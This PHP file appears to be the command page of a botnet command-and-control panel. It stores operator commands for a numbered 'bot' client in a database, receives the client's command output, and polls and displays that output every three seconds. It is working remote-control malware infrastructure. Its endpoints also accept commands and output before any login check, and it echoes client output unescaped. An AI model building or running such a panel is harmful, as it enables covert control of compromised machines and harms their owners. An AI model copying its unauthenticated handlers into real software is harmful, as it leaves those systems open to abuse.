<?php
include"db.php";

if(!isset($_GET["id"])){exit();}

$id=mysqli_real_escape_string($con,$_GET["id"]);
$result=mysqli_query($con,"SELECT * FROM clients where id='$id'");
if(mysqli_num_rows($result)<=0){echo"client not found !";exit();}
$row=mysqli_fetch_array($result);
if(!$row){echo"client not found !";exit();}



if(isset($_POST["output"])){
	
	$txt=mysqli_real_escape_string($con,$_POST["output"]);
	$query = "INSERT INTO commands_out (id, text) VALUES ('$id', '$txt') ON DUPLICATE KEY UPDATE text='$txt'";
    mysqli_query($con,$query);
	exit();
	
	
	
}

if(isset($_POST["command"])){
	$cmd=mysqli_real_escape_string($con,$_POST["command"]);
	$fullcommand="1|$cmd";
	$query = "INSERT INTO commands (id, command) VALUES ('$id', '$fullcommand')";
    mysqli_query($con,$query);
	exit();
	
	
	
}
if(!isset($_GET["admin"])){
	session_start();
	if(!isset($_SESSION['logged'])){echo"<script>window.location.href = 'login.php';</script>";exit();}
	$r=mysqli_query($con,"SELECT text FROM commands_out where id='$id'");
	if(mysqli_num_rows($r)<=0){exit();}
	$commandrow=mysqli_fetch_array($r);
	echo $commandrow["text"];
	exit();
	
	
}
else{
	session_start();
	if(!isset($_SESSION['logged'])){echo"<script>window.location.href = 'login.php';</script>";exit();}
	include"header.php";
	?><body>
	<center>
  <div id="centeredDiv">
    <h2 id="botname" style="color:red;"><?php echo $row["name"];?></h2>
    <div class="mb-3">
      <label for="output" style="color:green;font-weight:bold;" class="form-label">Last Output:</label>
      <textarea style="width:40%;height:40%;color:green;" class="form-control" id="output" rows="3" readonly></textarea>
    </div>
    <div class="mb-3">
      <label for="command" style="color:green;font-weight:bold;" class="form-label">Command:</label>
      <input type="text" style="width:40%;" class="form-control" id="command">
    </div>
    <button type="button" class="btn btn-primary" onclick="submitCommand()">Submit</button>
  </div>
	</center>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
  <script src="js/main.js"></script>
  <script>
    function submitCommand() {
      var command = document.getElementById('command').value;
	  postdata("command.php?id=<?php echo $id;?>",command,"command");
      
    }
	function outchk(){
		var endpoint="command.php?id=<?php echo $id;?>";
		getreq(endpoint,document.getElementById('output'));
		
		
		
	}
	outchk();
	setInterval(outchk, 3000);
  </script>
</body>
<?php
	
	
	
}



?>